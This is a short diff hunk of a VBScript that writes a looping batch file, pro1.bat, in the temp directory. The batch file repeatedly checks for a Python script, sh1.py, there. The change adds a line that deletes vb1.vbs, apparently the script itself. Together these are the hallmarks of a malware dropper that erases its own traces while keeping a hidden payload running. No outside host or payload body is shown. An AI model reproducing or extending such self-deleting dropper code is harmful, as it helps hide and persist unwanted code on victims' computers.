@@ -5,6 +5,7 @@ objShell.CurrentDirectory = temp_dir
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 Set objFile = objFSO.CreateTextFile("pro1.bat")
 objFile.WriteLine "@echo off"
+objFile.WriteLine "del vb1.vbs"
 objFile.WriteLine ":loop"
 objFile.WriteLine "set FILE=%temp%\sh1.py"
 objFile.WriteLine "if not exist %FILE% ("
